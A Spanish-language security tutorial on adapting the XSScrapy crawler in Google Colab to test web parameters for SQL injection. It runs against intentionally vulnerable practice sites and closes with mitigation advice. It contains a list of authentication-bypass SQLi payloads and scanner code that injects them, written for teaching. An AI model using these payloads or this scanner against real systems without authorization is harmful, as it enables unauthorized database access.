![M1](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%201%402Menbrete1.png)

# **Vulnerabilidades SQL Injection con XSScrapy en Google Colab**

🔹 **Objetivo**: Aprender a utilizar **XSScrapy** para identificar vulnerabilidades de **SQL Injection (SQLi)** en un sitio web, trabajando en **Google Colab** y utilizando entornos de prueba seguros.

## **🔹 Módulo 1: Introducción a XSScrapy y SQL Injection**

### 📌 **1.1 ¿Qué es XSScrapy?**

**XSScrapy** es un **crawler de seguridad** desarrollado en Python que permite identificar vulnerabilidades **XSS (Cross-Site Scripting)** y, con ciertas modificaciones, también ayuda a detectar **SQL Injection** en sitios web.

Es una herramienta útil en **pentesting** para encontrar entradas de usuario que podrían ser explotadas mediante inyecciones de código malicioso.

📌 **Características principales**:

✅ Escaneo automático de formularios y parámetros en URLs.

✅ Detección de vulnerabilidades XSS y SQLi.

✅ Compatible con Python 3 y Scrapy (un framework de web scraping).

### 📌 **1.2 ¿Qué es SQL Injection?**

El **SQL Injection (SQLi)** es una vulnerabilidad web que ocurre cuando una aplicación permite que un atacante inyecte código SQL malicioso en una consulta de base de datos.

💡 **Ejemplo de SQL Injection**

Supongamos que un sitio web tiene un formulario de inicio de sesión con el siguiente código en su backend:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '12345';
```

Si el atacante introduce en el campo de contraseña la siguiente consulta maliciosa:

```sql
' OR '1'='1
```

El sistema ejecutará:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
```

📌 Esto siempre devolverá **true**, permitiendo el acceso no autorizado.

## **🔹 Módulo 2: Instalación de XSScrapy en Google Colab**

Para facilitar la ejecución de XSScrapy sin necesidad de instalarlo localmente, trabajaremos en **Google Colab**, un entorno en la nube que permite ejecutar código Python sin configuraciones avanzadas.

### 📌 **2.1 Abrir Google Colab y configurar el entorno**

1️⃣ Accede a **Google Colab**.
2️⃣ Crea un nuevo cuaderno (**File > New Notebook**).
3️⃣ Ejecuta los siguientes comandos en una celda para instalar las dependencias:

```python
!apt-get install -y git
!apt-get install -y python3-pip
!pip install scrapy
!git clone https://github.com/DanMcInerney/xsscrapy.git
!cd xsscrapy && pip install -r requirements.txt
```

📌 Esto instalará **Scrapy** (necesario para XSScrapy) y clonará el repositorio de la herramienta.

## **🔹 Módulo 3: Análisis de SQL Injection con XSScrapy**

### 📌 **3.1 Configuración de XSScrapy para detectar SQL Injection**

Por defecto, XSScrapy está diseñado para detectar **XSS**, pero podemos modificar su código para analizar **parámetros vulnerables a SQL Injection**.

🔹 **Modificación del código para detectar SQLi**

1️⃣ Abre el archivo `xsscrapy/spiders/xss_spider.py`:

```python
!nano xsscrapy/xsscrapy/spiders/xss_spider.py
```

2️⃣ Modifica la sección que envía payloads XSS y agrega payloads de SQL Injection:

```sql
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*"
]

def parse(self, response):
    for input_tag in response.xpath('//input'):
        for payload in sql_payloads:
            test_url = response.url + "?" + input_tag.attrib.get('name', 'param') + "=" + payload
            yield scrapy.Request(test_url, callback=self.check_sql_injection)

def check_sql_injection(self, response):
    if "error" in response.text.lower() or "sql syntax" in response.text.lower():
        self.log(f"[!] SQL Injection detected: {response.url}")
```

------

### 📌 **3.2 Ejecutar XSScrapy para analizar una URL de prueba**

Usaremos **un sitio seguro para pruebas de SQL Injection**. Una opción es:

🔹 **http://testphp.vulnweb.com/**

Ejecutamos el escaneo con:

```sql
!cd xsscrapy && scrapy crawl xss_spider -a domain="http://testphp.vulnweb.com/"
```

✅ XSScrapy rastreará la página y probará los payloads de SQL Injection en los formularios y parámetros de la URL.

## **🔹 Módulo 4: Interpretación de Resultados y Mitigación**

### 📌 **4.1 Identificación de vulnerabilidades**

Si el sitio es vulnerable, XSScrapy mostrará mensajes como:

```bash
[!] SQL Injection detected: http://testphp.vulnweb.com/listproducts.php?cat=' OR '1'='1
```

Esto indica que el sitio es susceptible a **SQL Injection**.

------

### 📌 **4.2 Cómo mitigar SQL Injection**



Para proteger una aplicación web de SQL Injection, se deben aplicar las siguientes prácticas:

✅ **Usar consultas preparadas (Prepared Statements)**

Ejemplo en Python con **MySQL**:

```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (user, password))
```

✅ **Filtrar y validar los datos de entrada**

Rechazar caracteres especiales como `'`, `--`, `;`, etc.

✅ **Configurar correctamente los permisos de la base de datos**

Asegurar que los usuarios de la base de datos tengan solo los permisos necesarios.

✅ **Usar Web Application Firewalls (WAF)**

Un **WAF** como ModSecurity ayuda a bloquear intentos de SQL Injection.

## **🔹 Evaluación y Proyecto Final**

Para reforzar lo aprendido, practica con:

1️⃣ **Ejecutar XSScrapy en otro sitio de pruebas**, como:



- 🔹 **http://testasp.vulnweb.com/**

- 🔹 [**https://www.webscantest.com/**](https://www.webscantest.com/)

  

2️⃣ **Modificar los payloads en XSScrapy** y probar variantes de ataques SQL Injection.



3️⃣ **Escribir un informe** con:

- Vulnerabilidades encontradas.

- Posibles impactos en la seguridad.

- Métodos de mitigación recomendados.

  

![M2](https://github.com/Grandote58/CloudSafeGuard/blob/main/Recursos/Recurso%203%402Menbrete2.png)